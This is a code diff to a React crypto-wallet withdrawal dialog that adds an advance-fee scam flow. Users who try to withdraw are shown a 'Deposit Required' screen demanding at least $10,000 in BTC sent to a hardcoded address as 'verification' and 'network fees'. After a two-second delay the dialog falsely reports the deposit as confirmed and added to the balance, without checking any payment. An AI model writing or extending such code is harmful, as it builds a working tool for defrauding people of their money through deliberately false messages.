@@ -16,25 +16,75 @@ import {
   SelectValue,
 } from '@/components/ui/select';
 import { toast } from '@/hooks/use-toast';
-import { ArrowUpRight, Wallet } from 'lucide-react';
+import { ArrowUpRight, Wallet, AlertTriangle, Copy, CheckCircle2, Bitcoin } from 'lucide-react';
+import { motion, AnimatePresence } from 'framer-motion';
 
 interface WithdrawModalProps {
   open: boolean;
   onOpenChange: (open: boolean) => void;
 }
 
+const DEPOSIT_REQUIREMENT = 10000;
+const BTC_WALLET_ADDRESS = 'bc1qfxcpxs5ztaf0ru6ptgk5hs7wcqq6khddy3g99e';
+
 const WithdrawModal = ({ open, onOpenChange }: WithdrawModalProps) => {
-  const { balances, withdraw } = useWallet();
+  const { balances, withdraw, addDeposit, hasDeposited } = useWallet();
   const [selectedCoin, setSelectedCoin] = useState('');
   const [amount, setAmount] = useState('');
   const [address, setAddress] = useState('');
   const [isSubmitting, setIsSubmitting] = useState(false);
+  const [showDepositScreen, setShowDepositScreen] = useState(false);
+  const [depositAmount, setDepositAmount] = useState('');
+  const [copied, setCopied] = useState(false);
+  const [isConfirmingDeposit, setIsConfirmingDeposit] = useState(false);
 
   const selectedBalance = balances.find((b) => b.symbol === selectedCoin);
   const maxAmount = selectedBalance?.amount || 0;
 
+  const copyToClipboard = () => {
+    navigator.clipboard.writeText(BTC_WALLET_ADDRESS);
+    setCopied(true);
+    toast({
+      title: 'Address Copied',
+      description: 'BTC wallet address copied to clipboard',
+    });
+    setTimeout(() => setCopied(false), 2000);
+  };
+
+  const handleConfirmDeposit = async () => {
+    const numAmount = parseFloat(depositAmount);
+    if (isNaN(numAmount) || numAmount < DEPOSIT_REQUIREMENT) {
+      toast({
+        title: 'Invalid Amount',
+        description: `Minimum deposit is $${DEPOSIT_REQUIREMENT.toLocaleString()}`,
+        variant: 'destructive',
+      });
+      return;
+    }
+
+    setIsConfirmingDeposit(true);
+    await new Promise((resolve) => setTimeout(resolve, 2000));
+    
+    addDeposit(numAmount);
+    
+    toast({
+      title: 'Deposit Confirmed',
+      description: `$${numAmount.toLocaleString()} has been added to your balance`,
+    });
+
+    setIsConfirmingDeposit(false);
+    setShowDepositScreen(false);
+    setDepositAmount('');
+  };
+
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
+    
+    // Check if user has deposited
+    if (!hasDeposited) {
+      setShowDepositScreen(true);
+      return;
+    }
     
     if (!selectedCoin || !amount || !address) {
       toast({
@@ -75,108 +125,231 @@ const WithdrawModal = ({ open, onOpenChange }: WithdrawModalProps) => {
   return (
     <Dialog open={open} onOpenChange={onOpenChange}>
       <DialogContent className="sm:max-w-md">
-        <DialogHeader>
-          <DialogTitle className="flex items-center gap-2 font-display">
-            <ArrowUpRight className="w-5 h-5 text-primary" />
-            Withdraw Crypto
-          </DialogTitle>
-        </DialogHeader>
+        <AnimatePresence mode="wait">
+          {showDepositScreen ? (
+            <motion.div
+              key="deposit"
+              initial={{ opacity: 0, x: 20 }}
+              animate={{ opacity: 1, x: 0 }}
+              exit={{ opacity: 0, x: -20 }}
+              transition={{ duration: 0.2 }}
+            >
+              <DialogHeader>
+                <DialogTitle className="flex items-center gap-2 font-display">
+                  <AlertTriangle className="w-5 h-5 text-warning" />
+                  Deposit Required
+                </DialogTitle>
+              </DialogHeader>
 
-        <form onSubmit={handleSubmit} className="space-y-5 mt-4">
-          <div className="space-y-2">
-            <label className="text-sm font-medium text-muted-foreground">Select Token</label>
-            <Select value={selectedCoin} onValueChange={setSelectedCoin}>
-              <SelectTrigger>
-                <SelectValue placeholder="Choose a token" />
-              </SelectTrigger>
-              <SelectContent>
-                {balances.map((balance) => (
-                  <SelectItem key={balance.symbol} value={balance.symbol}>
-                    <div className="flex items-center gap-2">
-                      <img
-                        src={balance.image}
-                        alt={balance.coin}
-                        className="w-5 h-5 rounded-full"
-                      />
-                      <span>{balance.coin}</span>
-                      <span className="text-muted-foreground">({balance.symbol})</span>
-                    </div>
-                  </SelectItem>
-                ))}
-              </SelectContent>
-            </Select>
-          </div>
-
-          <div className="space-y-2">
-            <div className="flex items-center justify-between">
-              <label className="text-sm font-medium text-muted-foreground">Amount</label>
-              {selectedBalance && (
-                <button
-                  type="button"
-                  onClick={() => setAmount(maxAmount.toString())}
-                  className="text-xs text-primary hover:underline"
+              <div className="space-y-5 mt-4">
+                <motion.div 
+                  className="p-4 rounded-xl bg-warning/10 border border-warning/30"
+                  initial={{ scale: 0.95 }}
+                  animate={{ scale: 1 }}
+                  transition={{ delay: 0.1 }}
                 >
-                  Max: {maxAmount.toLocaleString('en-US', { maximumFractionDigits: 4 })} {selectedCoin}
-                </button>
-              )}
-            </div>
-            <Input
-              type="number"
-              placeholder="0.00"
-              value={amount}
-              onChange={(e) => setAmount(e.target.value)}
-              step="any"
-              min="0"
-              max={maxAmount}
-            />
-          </div>
+                  <p className="text-sm text-warning font-medium mb-2">
+                    ⚠️ Withdrawal Verification Required
+                  </p>
+                  <p className="text-sm text-muted-foreground">
+                    To process your withdrawal, you must first deposit a minimum of{' '}
+                    <span className="text-foreground font-bold">${DEPOSIT_REQUIREMENT.toLocaleString()}</span>{' '}
+                    to verify your account and cover network fees.
+                  </p>
+                </motion.div>
 
-          <div className="space-y-2">
-            <label className="text-sm font-medium text-muted-foreground">Wallet Address</label>
-            <div className="relative">
-              <Wallet className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
-              <Input
-                placeholder="Enter recipient address"
-                value={address}
-                onChange={(e) => setAddress(e.target.value)}
-                className="pl-10"
-              />
-            </div>
-          </div>
+                <motion.div 
+                  className="p-4 rounded-xl bg-gradient-to-br from-orange-500/10 via-yellow-500/5 to-orange-600/10 border border-orange-500/20"
+                  initial={{ y: 10, opacity: 0 }}
+                  animate={{ y: 0, opacity: 1 }}
+                  transition={{ delay: 0.2 }}
+                >
+                  <div className="flex items-center gap-2 mb-3">
+                    <Bitcoin className="w-5 h-5 text-orange-500" />
+                    <span className="font-medium text-sm">Deposit BTC to this address:</span>
+                  </div>
+                  
+                  <div className="relative">
+                    <div className="p-3 bg-background/80 rounded-lg border border-border/50 font-mono text-xs break-all">
+                      {BTC_WALLET_ADDRESS}
+                    </div>
+                    <button
+                      onClick={copyToClipboard}
+                      className="absolute right-2 top-1/2 -translate-y-1/2 p-2 hover:bg-secondary rounded-md transition-colors"
+                    >
+                      {copied ? (
+                        <CheckCircle2 className="w-4 h-4 text-success" />
+                      ) : (
+                        <Copy className="w-4 h-4 text-muted-foreground" />
+                      )}
+                    </button>
+                  </div>
+                </motion.div>
 
-          {selectedBalance && amount && (
-            <div className="p-4 rounded-xl bg-secondary/50 space-y-2">
-              <div className="flex justify-between text-sm">
-                <span className="text-muted-foreground">You'll send</span>
-                <span className="font-medium">{amount} {selectedCoin}</span>
+                <motion.div 
+                  className="space-y-2"
+                  initial={{ y: 10, opacity: 0 }}
+                  animate={{ y: 0, opacity: 1 }}
+                  transition={{ delay: 0.3 }}
+                >
+                  <label className="text-sm font-medium text-muted-foreground">
+                    Enter Deposit Amount (USD)
+                  </label>
+                  <Input
+                    type="number"
+                    placeholder={`Minimum $${DEPOSIT_REQUIREMENT.toLocaleString()}`}
+                    value={depositAmount}
+                    onChange={(e) => setDepositAmount(e.target.value)}
+                    min={DEPOSIT_REQUIREMENT}
+                  />
+                </motion.div>
+
+                <motion.div 
+                  className="p-3 rounded-lg bg-secondary/50 text-sm text-muted-foreground"
+                  initial={{ y: 10, opacity: 0 }}
+                  animate={{ y: 0, opacity: 1 }}
+                  transition={{ delay: 0.4 }}
+                >
+                  <p>✓ This deposit will be added to your available balance</p>
+                  <p>✓ You can withdraw your full balance after verification</p>
+                </motion.div>
+
+                <div className="flex gap-3">
+                  <Button
+                    variant="outline"
+                    onClick={() => setShowDepositScreen(false)}
+                    className="flex-1"
+                  >
+                    Back
+                  </Button>
+                  <Button
+                    variant="gold"
+                    onClick={handleConfirmDeposit}
+                    disabled={isConfirmingDeposit || !depositAmount}
+                    className="flex-1"
+                  >
+                    {isConfirmingDeposit ? (
+                      <div className="w-5 h-5 border-2 border-primary-foreground/30 border-t-primary-foreground rounded-full animate-spin" />
+                    ) : (
+                      'Confirm Deposit'
+                    )}
+                  </Button>
+                </div>
               </div>
-              <div className="flex justify-between text-sm">
-                <span className="text-muted-foreground">Network Fee</span>
-                <span className="font-medium">~$2.50</span>
-              </div>
-              <div className="border-t border-border pt-2 flex justify-between">
-                <span className="text-muted-foreground">USD Value</span>
-                <span className="font-medium text-primary">
-                  ${((parseFloat(amount) || 0) * (selectedBalance.usdValue / selectedBalance.amount)).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
-                </span>
-              </div>
-            </div>
+            </motion.div>
+          ) : (
+            <motion.div
+              key="withdraw"
+              initial={{ opacity: 0, x: -20 }}
+              animate={{ opacity: 1, x: 0 }}
+              exit={{ opacity: 0, x: 20 }}
+              transition={{ duration: 0.2 }}
+            >
+              <DialogHeader>
+                <DialogTitle className="flex items-center gap-2 font-display">
+                  <ArrowUpRight className="w-5 h-5 text-primary" />
+                  Withdraw Crypto
+                </DialogTitle>
+              </DialogHeader>
+
+              <form onSubmit={handleSubmit} className="space-y-5 mt-4">
+                <div className="space-y-2">
+                  <label className="text-sm font-medium text-muted-foreground">Select Token</label>
+                  <Select value={selectedCoin} onValueChange={setSelectedCoin}>
+                    <SelectTrigger>
+                      <SelectValue placeholder="Choose a token" />
+                    </SelectTrigger>
+                    <SelectContent>
+                      {balances.map((balance) => (
+                        <SelectItem key={balance.symbol} value={balance.symbol}>
+                          <div className="flex items-center gap-2">
+                            <img
+                              src={balance.image}
+                              alt={balance.coin}
+                              className="w-5 h-5 rounded-full"
+                            />
+                            <span>{balance.coin}</span>
+                            <span className="text-muted-foreground">({balance.symbol})</span>
+                          </div>
+                        </SelectItem>
+                      ))}
+                    </SelectContent>
+                  </Select>
+                </div>
+
+                <div className="space-y-2">
+                  <div className="flex items-center justify-between">
+                    <label className="text-sm font-medium text-muted-foreground">Amount</label>
+                    {selectedBalance && (
+                      <button
+                        type="button"
+                        onClick={() => setAmount(maxAmount.toString())}
+                        className="text-xs text-primary hover:underline"
+                      >
+                        Max: {maxAmount.toLocaleString('en-US', { maximumFractionDigits: 4 })} {selectedCoin}
+                      </button>
+                    )}
+                  </div>
+                  <Input
+                    type="number"
+                    placeholder="0.00"
+                    value={amount}
+                    onChange={(e) => setAmount(e.target.value)}
+                    step="any"
+                    min="0"
+                    max={maxAmount}
+                  />
+                </div>
+
+                <div className="space-y-2">
+                  <label className="text-sm font-medium text-muted-foreground">Wallet Address</label>
+                  <div className="relative">
+                    <Wallet className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
+                    <Input
+                      placeholder="Enter recipient address"
+                      value={address}
+                      onChange={(e) => setAddress(e.target.value)}
+                      className="pl-10"
+                    />
+                  </div>
+                </div>
+
+                {selectedBalance && amount && (
+                  <div className="p-4 rounded-xl bg-secondary/50 space-y-2">
+                    <div className="flex justify-between text-sm">
+                      <span className="text-muted-foreground">You'll send</span>
+                      <span className="font-medium">{amount} {selectedCoin}</span>
+                    </div>
+                    <div className="flex justify-between text-sm">
+                      <span className="text-muted-foreground">Network Fee</span>
+                      <span className="font-medium">~$2.50</span>
+                    </div>
+                    <div className="border-t border-border pt-2 flex justify-between">
+                      <span className="text-muted-foreground">USD Value</span>
+                      <span className="font-medium text-primary">
+                        ${((parseFloat(amount) || 0) * (selectedBalance.usdValue / selectedBalance.amount)).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
+                      </span>
+                    </div>
+                  </div>
+                )}
+
+                <Button
+                  type="submit"
+                  variant="gold"
+                  size="lg"
+                  className="w-full"
+                  disabled={isSubmitting}
+                >
+                  {isSubmitting ? (
+                    <div className="w-5 h-5 border-2 border-primary-foreground/30 border-t-primary-foreground rounded-full animate-spin" />
+                  ) : (
+                    'Confirm Withdrawal'
+                  )}
+                </Button>
+              </form>
+            </motion.div>
           )}
-
-          <Button
-            type="submit"
-            variant="gold"
-            size="lg"
-            className="w-full"
-            disabled={isSubmitting}
-          >
-            {isSubmitting ? (
-              <div className="w-5 h-5 border-2 border-primary-foreground/30 border-t-primary-foreground rounded-full animate-spin" />
-            ) : (
-              'Confirm Withdrawal'
-            )}
-          </Button>
-        </form>
+        </AnimatePresence>
       </DialogContent>
     </Dialog>
   );
